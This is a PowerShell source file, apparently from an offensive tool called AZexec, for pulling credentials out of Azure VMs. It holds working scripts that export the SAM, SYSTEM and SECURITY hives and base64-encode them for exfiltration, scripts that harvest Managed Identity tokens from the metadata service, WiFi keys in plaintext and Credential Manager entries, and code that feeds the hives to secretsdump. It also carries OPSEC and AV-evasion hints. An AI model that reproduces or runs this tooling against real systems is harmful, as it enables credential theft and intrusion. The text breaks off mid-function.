# AZexec - Credential Extraction Functions
# Azure equivalent of NetExec's --sam credential dumping functionality
# Supports SAM extraction, Managed Identity tokens, and DPAPI secrets

# ============================================
# OPSEC WARNING FUNCTION
# ============================================
function Show-CredentialOPSECWarning {
    param(
        [Parameter(Mandatory = $false)]
        [string]$CredMethod = "auto"
    )

    Write-ColorOutput -Message "`n[!] ========================================" -Color "Red"
    Write-ColorOutput -Message "[!] OPSEC WARNING: Credential Extraction Detection Risk" -Color "Red"
    Write-ColorOutput -Message "[!] ========================================" -Color "Red"
    Write-ColorOutput -Message "[!] This operation may trigger:" -Color "Yellow"
    Write-ColorOutput -Message "    - MDE: 'Credential dumping activity detected'" -Color "White"
    Write-ColorOutput -Message "    - Azure Security Center: 'Suspicious PowerShell execution'" -Color "White"
    Write-ColorOutput -Message "    - Event ID 4656/4663: SAM registry key access" -Color "White"
    Write-ColorOutput -Message "    - Event ID 4688: reg.exe execution" -Color "White"

    # Method-specific warnings
    switch ($CredMethod) {
        "lsa" {
            Write-ColorOutput -Message "    - Event ID 4656/4663: SECURITY hive access (LSA secrets)" -Color "White"
            Write-ColorOutput -Message "    - MDE: 'Suspicious registry hive export' (HIGH)" -Color "White"
        }
        "ntds" {
            Write-ColorOutput -Message "    - Event ID 8222: Shadow copy creation (VSS)" -Color "White"
            Write-ColorOutput -Message "    - ntdsutil.exe execution alerts" -Color "White"
            Write-ColorOutput -Message "    - MDE: 'Active Directory database dump' (HIGH)" -Color "White"
            Write-ColorOutput -Message "    - MDE: 'Suspicious Volume Shadow Copy activity' (MEDIUM)" -Color "White"
        }
        "lsass" {
            Write-ColorOutput -Message "    - Event ID 10: Sysmon process access on lsass.exe" -Color "White"
            Write-ColorOutput -Message "    - MDE: 'Suspicious LSASS access' (HIGH)" -Color "White"
            Write-ColorOutput -Message "    - MDE: 'LSASS memory dump detected' (HIGH)" -Color "White"
            Write-ColorOutput -Message "    - Windows Credential Guard may block this technique" -Color "White"
        }
        "backup" {
            Write-ColorOutput -Message "    - Event ID 4672: SeBackupPrivilege usage" -Color "White"
            Write-ColorOutput -Message "    - robocopy.exe /B (backup semantics) execution" -Color "White"
        }
        "sccm" {
            Write-ColorOutput -Message "    - Event ID 4663: SYSVOL GPP file access" -Color "White"
            Write-ColorOutput -Message "    - Filesystem scanning may trigger EDR behavioral alerts" -Color "White"
        }
        "wam" {
            Write-ColorOutput -Message "    - Event ID 4663: TokenBroker cache file access" -Color "White"
            Write-ColorOutput -Message "    - AAD Broker Plugin data access" -Color "White"
        }
        "wifi" {
            Write-ColorOutput -Message "    - netsh wlan profile queries (low noise)" -Color "White"
        }
        { $_ -in @("putty", "winscp", "vnc") } {
            Write-ColorOutput -Message "    - Registry enumeration of application credentials" -Color "White"
        }
        { $_ -in @("notepad", "notepadpp") } {
            Write-ColorOutput -Message "    - Reading application state/backup files from user profiles" -Color "White"
        }
        "keepass_discover" {
            Write-ColorOutput -Message "    - Filesystem scanning for KeePass files (.kdbx, config, executables)" -Color "White"
        }
        "keepass_trigger" {
            Write-ColorOutput -Message "    - KeePass config modification (writes to disk)" -Color "White"
            Write-ColorOutput -Message "    - Process restart (Stop-Process / Start-Process)" -Color "White"
        }
        "rdcman" {
            Write-ColorOutput -Message "    - Filesystem scanning for RDCMan configs (.rdg files)" -Color "White"
        }
        "eventlog_creds" {
            Write-ColorOutput -Message "    - Windows Event Log queries (Security/Sysmon)" -Color "White"
        }
        "mremoteng" {
            Write-ColorOutput -Message "    - Filesystem scanning for mRemoteNG configs (confCons.xml)" -Color "White"
        }
        "veeam" {
            Write-ColorOutput -Message "    - SQL Server queries to Veeam database" -Color "White"
            Write-ColorOutput -Message "    - DPAPI decryption calls (LocalMachine scope)" -Color "White"
        }
        { $_ -in @("all") } {
            Write-ColorOutput -Message "    - All method-specific detections apply (LSA, NTDS, LSASS, SCCM, WAM, WiFi, PuTTY, WinSCP, VNC, mRemoteNG, Veeam, KeePass, RDCMan, EventLog)" -Color "White"
        }
    }

    Write-ColorOutput -Message "[*] Use -AmsiBypass for evasion (same as exec command)`n" -Color "Cyan"
}

# ============================================
# SCRIPT GENERATION FUNCTIONS
# ============================================

<#
.SYNOPSIS
    Generate PowerShell script for SAM/SYSTEM/SECURITY registry hive extraction.
.DESCRIPTION
    Creates a PowerShell script that exports registry hives and base64 encodes them
    for transfer via Run Command output. Uses reg.exe for better AV evasion.
.OUTPUTS
    String containing the PowerShell script.
#>
function Get-SAMExtractionScript {
    return @'
$tempDir = "$env:TEMP\azx_$(Get-Random)"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
try {
    # Export hives using reg.exe (better AV evasion than PowerShell)
    reg.exe save HKLM\SAM "$tempDir\SAM" /y 2>&1 | Out-Null
    reg.exe save HKLM\SYSTEM "$tempDir\SYSTEM" /y 2>&1 | Out-Null
    reg.exe save HKLM\SECURITY "$tempDir\SECURITY" /y 2>&1 | Out-Null

    # Verify exports succeeded
    if (-not (Test-Path "$tempDir\SAM") -or -not (Test-Path "$tempDir\SYSTEM")) {
        Write-Output "---ERROR---"
        Write-Output "Failed to export registry hives - requires SYSTEM privileges"
        return
    }

    # Base64 encode for transfer
    $sam = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$tempDir\SAM"))
    $system = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$tempDir\SYSTEM"))
    $security = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$tempDir\SECURITY"))

    # Structured output with delimiters
    Write-Output "---SAM---"
    Write-Output $sam
    Write-Output "---SYSTEM---"
    Write-Output $system
    Write-Output "---SECURITY---"
    Write-Output $security
    Write-Output "---SUCCESS---"
} catch {
    Write-Output "---ERROR---"
    Write-Output $_.Exception.Message
} finally {
    # Cleanup
    Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
}
'@
}

<#
.SYNOPSIS
    Generate PowerShell script for IMDS Managed Identity token extraction.
.DESCRIPTION
    Creates a PowerShell script that queries the Azure Instance Metadata Service
    to extract Managed Identity tokens for various Azure resources.
.OUTPUTS
    String containing the PowerShell script.
#>
function Get-TokenExtractionScript {
    return @'
$imdsUrl = "http://169.254.169.254/metadata/identity/oauth2/token"
$headers = @{"Metadata" = "true"}
$resources = @(
    "https://management.azure.com/",
    "https://graph.microsoft.com/",
    "https://vault.azure.net/",
    "https://storage.azure.com/",
    "https://database.windows.net/",
    "https://servicebus.azure.net/"
)
$tokens = @()
$hasIdentity = $false

foreach ($r in $resources) {
    try {
        $uri = "${imdsUrl}?api-version=2018-02-01&resource=$r"
        $resp = Invoke-RestMethod -Uri $uri -Headers $headers -TimeoutSec 5 -ErrorAction Stop
        $hasIdentity = $true
        $tokens += [PSCustomObject]@{
            Resource = $r
            Token = $resp.access_token
            TokenType = $resp.token_type
            ExpiresIn = $resp.expires_in
            ExpiresOn = $resp.expires_on
            ClientId = $resp.client_id
        }
    } catch {
        # Silently skip resources that don't have tokens
    }
}

Write-Output "---TOKENS---"
if ($tokens.Count -gt 0) {
    Write-Output ($tokens | ConvertTo-Json -Compress -Depth 5)
    Write-Output "---SUCCESS---"
} elseif (-not $hasIdentity) {
    Write-Output "NO_MANAGED_IDENTITY"
    Write-Output "---SUCCESS---"
} else {
    Write-Output "NO_TOKENS"
    Write-Output "---SUCCESS---"
}
'@
}

<#
.SYNOPSIS
    Generate PowerShell script for DPAPI secrets extraction.
.DESCRIPTION
    Creates a PowerShell script that extracts Windows Credential Manager entries,
    WiFi profiles with PSKs, and identifies browser credential paths.
.OUTPUTS
    String containing the PowerShell script.
#>
function Get-DPAPIExtractionScript {
    return @'
$results = @{
    CredentialManager = @()
    WiFiProfiles = @()
    BrowserPaths = @()
    Hostname = $env:COMPUTERNAME
    Username = $env:USERNAME
}

# Windows Credential Manager (cmdkey)
try {
    $vaultOutput = cmdkey /list 2>&1 | Out-String
    if ($vaultOutput -match "Target:") {
        # Parse cmdkey output into structured data
        $currentCred = $null
        foreach ($line in ($vaultOutput -split "`n")) {
            if ($line -match "^\s*Target:\s*(.+)$") {
                if ($currentCred) { $results.CredentialManager += $currentCred }
                $currentCred = @{ Target = $Matches[1].Trim(); Type = ""; User = "" }
            }
            elseif ($line -match "^\s*Type:\s*(.+)$" -and $currentCred) {
                $currentCred.Type = $Matches[1].Trim()
            }
            elseif ($line -match "^\s*User:\s*(.+)$" -and $currentCred) {
                $currentCred.User = $Matches[1].Trim()
            }
        }
        if ($currentCred) { $results.CredentialManager += $currentCred }
    }
} catch {}

# WiFi Profiles with PSK (plaintext keys)
try {
    $profilesRaw = netsh wlan show profiles 2>&1
    if ($profilesRaw -notmatch "is not running") {
        $profiles = $profilesRaw | Select-String "All User Profile\s*:\s*(.+)" | ForEach-Object {
            $_.Matches.Groups[1].Value.Trim()
        }
        foreach ($p in $profiles) {
            if ([string]::IsNullOrWhiteSpace($p)) { continue }
            $detail = netsh wlan show profile name="$p" key=clear 2>&1 | Out-String
            $keyMatch = [regex]::Match($detail, "Key Content\s*:\s*(.+)")
            $authMatch = [regex]::Match($detail, "Authentication\s*:\s*(.+)")
            $cipherMatch = [regex]::Match($detail, "Cipher\s*:\s*(.+)")

            $wifiEntry = @{
                SSID = $p
                Key = if ($keyMatch.Success) { $keyMatch.Groups[1].Value.Trim() } else { "" }
                Authentication = if ($authMatch.Success) { $authMatch.Groups[1].Value.Trim() } else { "" }
                Cipher = if ($cipherMatch.Success) { $cipherMatch.Groups[1].Value.Trim() } else { "" }
            }
            if ($wifiEntry.Key) {
                $results.WiFiProfiles += $wifiEntry
            }
        }
    }
} catch {}

# Browser credential paths (for offline extraction)
$browserPaths = @(
    @{ Browser = "Chrome"; Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" }
    @{ Browser = "Chrome"; Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" }
    @{ Browser = "Edge"; Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data" }
    @{ Browser = "Edge"; Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies" }
    @{ Browser = "Firefox"; Path = "$env:APPDATA\Mozilla\Firefox\Profiles" }
    @{ Browser = "Brave"; Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data" }
)

foreach ($bp in $browserPaths) {
    if (Test-Path $bp.Path) {
        $results.BrowserPaths += @{
            Browser = $bp.Browser
            Path = $bp.Path
            Exists = $true
        }
    }
}

Write-Output "---DPAPI---"
Write-Output ($results | ConvertTo-Json -Depth 5 -Compress)
Write-Output "---SUCCESS---"
'@
}

# ============================================
# OUTPUT PARSING FUNCTIONS
# ============================================

<#
.SYNOPSIS
    Parse SAM extraction output and decode registry hives.
.DESCRIPTION
    Parses the delimited output from SAM extraction script,
    decodes base64 hives, and attempts to extract password hashes.
.PARAMETER Output
    Raw output from the SAM extraction script.
.PARAMETER TempDir
    Temporary directory to save decoded hives.
.OUTPUTS
    PSCustomObject with extraction results.
#>
function Parse-SAMOutput {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Output,

        [Parameter(Mandatory = $false)]
        [string]$TempDir = "$env:TEMP\azx_sam_$(Get-Random)"
    )

    $result = @{
        Success = $false
        Hashes = @()
        SAMPath = $null
        SYSTEMPath = $null
        SECURITYPath = $null
        Error = $null
        RawHashes = ""
    }

    # Check for errors
    if ($Output -match "---ERROR---") {
        $errorMsg = ($Output -split "---ERROR---")[1].Trim()
        $result.Error = $errorMsg
        return [PSCustomObject]$result
    }

    # Check for success
    if ($Output -notmatch "---SUCCESS---") {
        $result.Error = "Extraction did not complete successfully"
        return [PSCustomObject]$result
    }

    try {
        # Create temp directory for hive files
        New-Item -ItemType Directory -Path $TempDir -Force | Out-Null

        # Extract base64 encoded hives
        if ($Output -match "---SAM---\s*([A-Za-z0-9+/=]+)\s*---SYSTEM---") {
            $samB64 = $Matches[1].Trim()
            $samBytes = [Convert]::FromBase64String($samB64)
            $result.SAMPath = Join-Path $TempDir "SAM"
            [IO.File]::WriteAllBytes($result.SAMPath, $samBytes)
        }

        if ($Output -match "---SYSTEM---\s*([A-Za-z0-9+/=]+)\s*---SECURITY---") {
            $systemB64 = $Matches[1].Trim()
            $systemBytes = [Convert]::FromBase64String($systemB64)
            $result.SYSTEMPath = Join-Path $TempDir "SYSTEM"
            [IO.File]::WriteAllBytes($result.SYSTEMPath, $systemBytes)
        }

        if ($Output -match "---SECURITY---\s*([A-Za-z0-9+/=]+)\s*---SUCCESS---") {
            $securityB64 = $Matches[1].Trim()
            $securityBytes = [Convert]::FromBase64String($securityB64)
            $result.SECURITYPath = Join-Path $TempDir "SECURITY"
            [IO.File]::WriteAllBytes($result.SECURITYPath, $securityBytes)
        }

        # Try to parse hashes using secretsdump if available
        $secretsdumpPath = Test-SecretsdumpAvailable
        if ($secretsdumpPath -and $result.SAMPath -and $result.SYSTEMPath) {
            $hashOutput = & python $secretsdumpPath -sam $result.SAMPath -system $result.SYSTEMPath LOCAL 2>&1
            $result.RawHashes = $hashOutput | Out-String

            # Parse hash output
            foreach ($line in $hashOutput) {
                if ($line -match "^([^:]+):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::$") {
                    $result.Hashes += [PSCustomObject]@{
                        Username = $Matches[1]
                        RID = $Matches[2]
                        LMHash = $Matches[3]
                        NTHash = $Matches[4]
                        HashLine = $line
                    }
                }
            }
            $result.Success = $true
        } else {
            # Fallback: Embedded parsing (basic bootkey + SAM decryption)
            $bootkey = Get-BootkeyFromSystem -SystemPath $result.SYSTEMPath
            if ($bootkey) {
                $hashes = Get-SAMHashesWithBootkey -SAMPath $result.SAMPath -Bootkey $bootkey
                $result.Hashes = $hashes
                $result.Success = ($hashes.Count -gt 0)

                # Build raw hash output for display
                foreach ($h in $hashes) {
                    $result.RawHashes += "$($h.Username):$($h.RID):$($h.LMHash):$($h.NTHash):::`n"
                }
            } else {
                $result.Error = "Could not extract bootkey from SYSTEM hive"
                # Still mark partial success - hives were extracted
                $result.Success = $true
            }
        }

    } catch {
        $result.Error = $_.Exception.Message
    }

    return [PSCustomObject]$result
}

<#
.SYNOPSIS
    Check if secretsdump.py is available on the system.
.OUTPUTS
    Path to secretsdump.py if found, $null otherwise.
#>
function Test-SecretsdumpAvailable {
    $searchPaths = @(
        (Get-Command "secretsdump.py" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Source),
        "$env:USERPROFILE\.local\bin\secretsdump.py",
        "C:\Tools\impacket\secretsdump.py",
        "C:\Python*\Scripts\secretsdump.py",
        "/usr/local/bin/secretsdump.py",
        "/usr/bin/secretsdump.py"
    )

    foreach ($p in $searchPaths) {
        if ($p -and (Test-Path $p -ErrorAction SilentlyContinue)) {
            return $p
        }
    }
    return $null
}

<#
.SYNOPSIS
    Check if pypykatz is available on the system.
.OUTPUTS
    Path to pypykatz if found, $null otherwise.
#>
function Test-PypykatzAvailable {
    $searchPaths = @(
        (Get-Command "pypykatz" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Source),
        "$env:USERPROFILE\.local\bin\pypykatz.exe",
        "C:\Tools\pypykatz\pypykatz.exe",
        "C:\Python*\Scripts\pypykatz.exe",
        "/usr/local/bin/pypykatz",
        "/usr/bin/pypykatz"
    )

    foreach ($p in $searchPaths) {
        if ($p -and (Test-Path $p -ErrorAction SilentlyContinue)) {
            return $p
        }
    }
    return $null
}

<#
.SYNOPSIS
    Extract bootkey from SYSTEM registry hive.
.DESCRIPTION
    Reads the LSA key components from the SYSTEM hive and derives the bootkey.
.PARAMETER SystemPath
    Path to the SYSTEM hive file.
.OUTPUTS
    Bootkey as byte array, or $null on failure.
#>
function Get-BootkeyFromSystem {
    param(
        [Parameter(Mandatory = $true)]
        [string]$SystemPath
    )

    try {
        # Load the SYSTEM hive
        $hiveBytes = [IO.File]::ReadAllBytes($SystemPath)

        # The bootkey is derived from the class names of 4 registry keys under
        # HKLM\SYSTEM\CurrentControlSet\Control\Lsa
        # Keys: JD, Skew1, GBG, Data
        # The class names are scrambled according to a specific permutation

        # This is a simplified implementation - for production use,
        # consider using a proper registry hive parser library

        # Search for the LSA key pattern in the hive
        $lsaPattern = [System.Text.Encoding]::Unicode.GetBytes("Lsa")
        $jdPattern = [System.Text.Encoding]::Unicode.GetBytes("JD")
        $skewPattern = [System.Text.Encoding]::Unicode.GetBytes("Skew1")
        $gbgPattern = [System.Text.Encoding]::Unicode.GetBytes("GBG")
        $dataPattern = [System.Text.Encoding]::Unicode.GetBytes("Data")

        # For a robust implementation, we'd need a full registry hive parser
        # Return null to trigger the "hives extracted, use secretsdump" message
        return $null

    } catch {
        return $null
    }
}

<#
.SYNOPSIS
    Extract SAM hashes using the bootkey.
.PARAMETER SAMPath
    Path to the SAM hive file.
.PARAMETER Bootkey
    Bootkey byte array from SYSTEM hive.
.OUTPUTS
    Array of hash objects.
#>
function Get-SAMHashesWithBootkey {
    param(
        [Parameter(Mandatory = $true)]
        [string]$SAMPath,

        [Parameter(Mandatory = $true)]
        [byte[]]$Bootkey
    )

    # Placeholder - full implementation would decrypt SAM entries
    # For now, return empty array and recommend secretsdump
    return @()
}

<#
.SYNOPSIS
    Parse token extraction output.
.PARAMETER Output
    Raw output from the token extraction script.
.OUTPUTS
    PSCustomObject with token results.
#>
function Parse-TokenOutput {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Output
    )

    $result = @{
        Success = $false
        Tokens = @()
        HasManagedIdentity = $false
        Error = $null
    }

    if ($Output -notmatch "---SUCCESS---") {
        $result.Error = "Token extraction did not complete successfully"
        return [PSCustomObject]$result
    }

    if ($Output -match "---TOKENS---\s*(.+)\s*---SUCCESS---") {
        $tokenData = $Matches[1].Trim()

        if ($tokenData -eq "NO_MANAGED_IDENTITY") {
            $result.Success = $true
            $result.HasManagedIdentity = $false
        } elseif ($tokenData -eq "NO_TOKENS") {
            $result.Success = $true
            $result.HasManagedIdentity = $true
        } else {
            try {
                $tokens = $tokenData | ConvertFrom-Json
                if ($tokens -is [Array]) {
                    $result.Tokens = $tokens
                } else {
                    $result.Tokens = @($tokens)
                }
                $result.Success = $true
                $result.HasManagedIdentity = $true
            } catch {
                $result.Error = "Failed to parse token JSON: $($_.Exception.Message)"
            }
        }
    }

    return [PSCustomObject]$result
}

<#
.SYNOPSIS
    Parse DPAPI extraction output.
.PARAMETER Output
    Raw output from the DPAPI extraction script.
.OUTPUTS
    PSCustomObject with DPAPI results.
#>
function Parse-DPAPIOutput {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Output
    )

    $result = @{
        Success = $false
        CredentialManager = @()
        WiFiProfiles = @()
        BrowserPaths = @()
        Hostname = ""
        Username = ""
        Error = $null
    }

    if ($Output -notmatch "---SUCCESS---") {
        $result.Error = "DPAPI extraction did not complete successfully"
        return [PSCustomObject]$result
    }

    if ($Output -match "---DPAPI---\s*(.+)\s*---SUCCESS---") {
        $dpapiData = $Matches[1].Trim()

        try {
            $parsed = $dpapiData | ConvertFrom-Json
            $result.CredentialManager = if ($parsed.CredentialManager) { $parsed.CredentialManager } else { @() }
            $result.WiFiProfiles = if ($parsed.WiFiProfiles) { $parsed.WiFiProfiles } else { @() }
            $result.BrowserPaths = if ($parsed.BrowserPaths) { $parsed.BrowserPaths } else { @() }
            $result.Hostname = if ($parsed.Hostname) { $parsed.Hostname } else { "" }
            $result.Username = if ($parsed.Username) { $parsed.Username } else { "" }
            $result.Success = $true
        } catch {
            $result.Error = "Failed to parse DPAPI JSON: $($_.Exception.Message)"
        }
    }

    return [PSCustomObject]$result
}

# ============================================
# OUTPUT FORMATTING FUNCTIONS
# ============================================

<#
.SYNOPSIS
    Format credential extraction results in NetExec style.
.PARAMETER TargetName
    Name of the target (VM/Device).
.PARAMETER OSType
    Operating system type.
.PARAMETER ExtractType
    Type of extraction (SAM, TOKEN, DPAPI).
.PARAMETER Data
    Extraction data to format.
#>
function Format-CredentialOutput {
    param(
        [Parameter(Mandatory = $true)]
        [string]$TargetName,

        [Parameter(Mandatory = $false)]
        [string]$OSType = "Windows",

        [Parameter(Mandatory = $true)]
        [ValidateSet("SAM", "TOKEN", "DPAPI", "LSA", "NTDS", "LSASS", "BACKUP", "SCCM", "WAM", "WIFI", "PUTTY", "NOTEPAD", "NOTEPADPP", "KEEPASS_DISCOVER", "KEEPASS_TRIGGER", "RDCMAN", "EVENTLOG_CREDS", "WINSCP", "VNC", "MREMOTENG", "VEEAM")]
        [string]$ExtractType,

        [Parameter(Mandatory = $true)]
        $Data
    )

    $prefix = "AZR".PadRight(7)
    $target = $TargetName.PadRight(20)
    $port = "443".PadRight(6)
    $os = $OSType.PadRight(12)

    switch ($ExtractType) {
        "SAM" {
            Write-ColorOutput -Message "${prefix}${target}${port}${os}(SAM_DUMP)" -Color "Cyan"

            if ($Data.Hashes -and $Data.Hashes.Count -gt 0) {
                foreach ($hash in $Data.Hashes) {
                    $hashLine = "$($hash.Username):$($hash.RID):$($hash.LMHash):$($hash.NTHash):::"
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}${hashLine}" -Color "Green"
                }
            } elseif ($Data.SAMPath -and $Data.SYSTEMPath) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}Registry hives extracted - use secretsdump.py:" -Color "Yellow"
                Write-ColorOutput -Message "${prefix}${target}${port}${os}  SAM:      $($Data.SAMPath)" -Color "White"
                Write-ColorOutput -Message "${prefix}${target}${port}${os}  SYSTEM:   $($Data.SYSTEMPath)" -Color "White"
                Write-ColorOutput -Message "${prefix}${target}${port}${os}  SECURITY: $($Data.SECURITYPath)" -Color "White"
                Write-ColorOutput -Message "${prefix}${target}${port}${os}  Command: secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL" -Color "Cyan"
            } elseif ($Data.Error) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}SAM extraction failed: $($Data.Error)" -Color "Red"
            }
        }

        "TOKEN" {
            Write-ColorOutput -Message "${prefix}${target}${port}${os}(TOKEN_DUMP)" -Color "Cyan"

            if (-not $Data.HasManagedIdentity) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}No Managed Identity configured" -Color "Yellow"
            } elseif ($Data.Tokens.Count -eq 0) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}Managed Identity exists but no tokens obtained" -Color "Yellow"
            } else {
                foreach ($token in $Data.Tokens) {
                    $resource = $token.Resource -replace "https://", "" -replace "/", ""
                    $expires = if ($token.ExpiresIn) { "$($token.ExpiresIn)s" } else { "unknown" }
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}MI Token: ${resource} (expires: ${expires})" -Color "Green"

                    # Show truncated token for verification
                    if ($token.Token) {
                        $tokenPreview = $token.Token.Substring(0, [Math]::Min(50, $token.Token.Length)) + "..."
                        Write-ColorOutput -Message "${prefix}${target}${port}${os}  Token: ${tokenPreview}" -Color "DarkGray"
                    }
                }
            }
        }

        "DPAPI" {
            Write-ColorOutput -Message "${prefix}${target}${port}${os}(DPAPI_DUMP)" -Color "Cyan"

            # WiFi Profiles
            if ($Data.WiFiProfiles -and $Data.WiFiProfiles.Count -gt 0) {
                foreach ($wifi in $Data.WiFiProfiles) {
                    $ssid = $wifi.SSID
                    $key = $wifi.Key
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}WiFi: ${ssid} -> [PLAINTEXT] ${key}" -Color "Green"
                }
            }

            # Credential Manager
            if ($Data.CredentialManager -and $Data.CredentialManager.Count -gt 0) {
                foreach ($cred in $Data.CredentialManager) {
                    $credTarget = $cred.Target
                    $credUser = $cred.User
                    if ($credTarget -and $credUser) {
                        Write-ColorOutput -Message "${prefix}${target}${port}${os}CredMan: ${credTarget} -> ${credUser}" -Color "Yellow"
                    }
                }
            }

            # Browser Paths
            if ($Data.BrowserPaths -and $Data.BrowserPaths.Count -gt 0) {
                foreach ($browser in $Data.BrowserPaths) {
                    $browserName = $browser.Browser
                    $pathType = if ($browser.Path -match "Login Data") { "Login Data" } else { "Data" }
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}Browser: ${browserName} ${pathType} found (extract offline)" -Color "Yellow"
                }
            }

            # No findings
            if ((-not $Data.WiFiProfiles -or $Data.WiFiProfiles.Count -eq 0) -and
                (-not $Data.CredentialManager -or $Data.CredentialManager.Count -eq 0) -and
                (-not $Data.BrowserPaths -or $Data.BrowserPaths.Count -eq 0)) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}No DPAPI secrets found" -Color "DarkGray"
            }
        }

        "LSA" {
            Write-ColorOutput -Message "${prefix}${target}${port}${os}(LSA_DUMP)" -Color "Cyan"

            if ($Data.Secrets -and $Data.Secrets.Count -gt 0) {
                foreach ($secret in $Data.Secrets) {
                    $name = $secret.Name
                    $value = if ($secret.Value.Length -gt 60) { $secret.Value.Substring(0, 60) + "..." } else { $secret.Value }
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}LSA Secret: ${name} -> ${value}" -Color "Green"
                }
            }
            if ($Data.CachedDomainCreds -and $Data.CachedDomainCreds.Count -gt 0) {
                foreach ($cached in $Data.CachedDomainCreds) {
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}DCC2: $($cached.Domain)\$($cached.Username):$($cached.Hash)" -Color "Green"
                }
            }
            if ($Data.MachineAccountHash) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}Machine Account: $($Data.MachineAccountHash)" -Color "Green"
            }
            if ($Data.DPAPIBackupKey) {
                $keyPreview = if ($Data.DPAPIBackupKey.Length -gt 40) { $Data.DPAPIBackupKey.Substring(0, 40) + "..." } else { $Data.DPAPIBackupKey }
                Write-ColorOutput -Message "${prefix}${target}${port}${os}DPAPI Backup Key: ${keyPreview}" -Color "Green"
            }
            if ($Data.SYSTEMPath -and $Data.SECURITYPath -and (-not $Data.Secrets -or $Data.Secrets.Count -eq 0)) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}Registry hives extracted - use secretsdump.py:" -Color "Yellow"
                Write-ColorOutput -Message "${prefix}${target}${port}${os}  SYSTEM:   $($Data.SYSTEMPath)" -Color "White"
                Write-ColorOutput -Message "${prefix}${target}${port}${os}  SECURITY: $($Data.SECURITYPath)" -Color "White"
                Write-ColorOutput -Message "${prefix}${target}${port}${os}  Command: secretsdump.py -security SECURITY -system SYSTEM LOCAL" -Color "Cyan"
            }
            if ($Data.Error) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}LSA extraction failed: $($Data.Error)" -Color "Red"
            }
        }

        "NTDS" {
            Write-ColorOutput -Message "${prefix}${target}${port}${os}(NTDS_DUMP)" -Color "Cyan"

            if ($Data.Hashes -and $Data.Hashes.Count -gt 0) {
                foreach ($hash in $Data.Hashes) {
                    $hashLine = "$($hash.Username):$($hash.RID):$($hash.LMHash):$($hash.NTHash):::"
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}${hashLine}" -Color "Green"
                }
                Write-ColorOutput -Message "${prefix}${target}${port}${os}Total hashes: $($Data.Hashes.Count)" -Color "Cyan"
            } elseif ($Data.StagedFiles) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}NTDS.dit staged for transfer:" -Color "Yellow"
                foreach ($file in $Data.StagedFiles) {
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}  $($file.Path) ($($file.Size))" -Color "White"
                }
                if ($Data.LocalPath) {
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}Downloaded to: $($Data.LocalPath)" -Color "Green"
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}  Command: secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL" -Color "Cyan"
                }
            } elseif ($Data.Error) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}NTDS extraction failed: $($Data.Error)" -Color "Red"
            }
        }

        "LSASS" {
            Write-ColorOutput -Message "${prefix}${target}${port}${os}(LSASS_DUMP)" -Color "Cyan"

            if ($Data.Credentials -and $Data.Credentials.Count -gt 0) {
                foreach ($cred in $Data.Credentials) {
                    $credType = $cred.Type
                    $domain = if ($cred.Domain) { "$($cred.Domain)\" } else { "" }
                    $username = $cred.Username
                    $secret = if ($cred.NTHash) { $cred.NTHash } elseif ($cred.Password) { "[PLAINTEXT] $($cred.Password)" } else { "N/A" }
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}${credType}: ${domain}${username}:${secret}" -Color "Green"
                }
            }
            if ($Data.StagedDumpPath) {
                $sizeStr = if ($Data.DumpSizeMB) { "$($Data.DumpSizeMB) MB" } else { "unknown size" }
                Write-ColorOutput -Message "${prefix}${target}${port}${os}LSASS dump staged: $($Data.StagedDumpPath) (${sizeStr})" -Color "Yellow"
                if ($Data.LocalDumpPath) {
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}Downloaded to: $($Data.LocalDumpPath)" -Color "Green"
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}  Command: pypykatz lsa minidump $($Data.LocalDumpPath)" -Color "Cyan"
                }
            }
            if ($Data.Error) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}LSASS extraction failed: $($Data.Error)" -Color "Red"
            }
        }

        "BACKUP" {
            Write-ColorOutput -Message "${prefix}${target}${port}${os}(BACKUP_DUMP)" -Color "Cyan"

            if ($Data.HasBackupPrivilege) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}SeBackupPrivilege: ENABLED" -Color "Green"
            } else {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}SeBackupPrivilege: DISABLED" -Color "Red"
            }
            if ($Data.IsDomainController) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}Domain Controller: YES" -Color "Green"
            }
            # Delegate to SAM/LSA display for extracted hives
            if ($Data.Hashes -and $Data.Hashes.Count -gt 0) {
                foreach ($hash in $Data.Hashes) {
